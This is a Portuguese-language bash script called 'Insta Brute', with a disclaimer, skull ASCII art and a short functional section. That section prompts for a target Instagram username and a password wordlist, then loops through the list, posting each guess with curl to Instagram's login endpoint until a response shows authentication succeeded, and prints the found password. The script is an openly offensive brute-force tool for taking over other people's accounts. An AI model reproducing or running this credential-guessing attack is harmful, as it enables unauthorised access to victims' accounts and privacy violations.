#!/bin/env/bash
# Author: DEFA1T1/Ronny
# Date:19/03/23
# Hour: 07:22h Brazil


#---------------------------------------------
# Título
echo -e "\e[31m$(figlet -f future -c ATENCAO LEIA!!)"
echo -e "\e[31m Esta ferramenta é uma propriedade paga e tenhamos todos consciência que o"
echo -e "\e[31m seu uso pode trazer problemas ou consequências graves quando se trata de ENGENHARIA REVERSA!" 
echo -e "\e[31m no entanto, não nos responsabilizamos pelos seus atos e esperamos que todos estejam cientes"
echo -e "\e[31m de vossas atitudes..."
echo -e "\e[32m$(figlet -f banner -c Insta Brute 💀💀💀)"
figlet -f term -c By Defa1lt1/ronny|lolcat

echo -e "\e[31m$    ……………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  "
echo -e "\e[31m$    …………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄"
echo -e "\e[31m$    ………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄"
echo -e "\e[31m$    ……▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄ "
echo -e "\e[31m$    …..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█ "
echo -e "\e[31m$    ..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█ "
echo -e "\e[31m$    ..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█ "
echo -e "\e[31m$     ▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌ "
echo -e "\e[31m$     █▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█ "
echo -e "\e[31m$     █▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓ "
echo -e "\e[31m$     █▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█ "
echo -e "\e[31m$     █▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█   "
echo -e "\e[31m$     █▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█  "
echo -e "\e[31m$     █▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓  "
echo -e "\e[31m$     ██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██  "
echo -e "\e[31m$     ██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██   "
echo -e "\e[31m$     █▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█    "
echo -e "\e[31m$     █▓▒░▒▓███████▓▓▄▀░░▀...▄▓▓███████▓▒▓█   "
echo -e "\e[31m$ ....█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█    "
echo -e "\e[31m$ ......█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█    "
echo -e "\e[31m$ ........█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█    "
echo -e "\e[31m$ ........▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀   "
echo -e "\e[31m$ ............░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░   "
echo -e "\e[31m$ ...........█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█   "
echo -e "\e[31m$ ............█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█   "
echo -e "\e[31m$ .............█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█   "
echo -e "\e[31m$ .............▐█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌   "
echo -e "\e[31m$ ...............█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█   "
echo -e "\e[31m$ .............. █▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█  "
echo -e "\e[31m$ ................█▓▓█░░░░▀▀▀▀░░░░░█▓▓█  "




USERNAME="example" 
echo "Coloque o  usuário aqui e pressione ENTER:"|lolcat
read USERNAME

PASSWORD_LIST="/example/senhas.txt"
echo "Coloque a lista de senhas aqui e pressione ENTER:"|lolcat
read PASSWORD_LIST

while read password; do
  curl -c cookies.txt -d "username=$USERNAME&password=$password" -L https://www.instagram.com/accounts/login/ajax/ -o response.txt
  login_status=$(grep -o "\"authenticated\": true" response.txt)
  if [ "$login_status" != "" ]; then
    echo "Senha encontrada: $password"
    exit 0
  fi
done < $PASSWORD_LIST
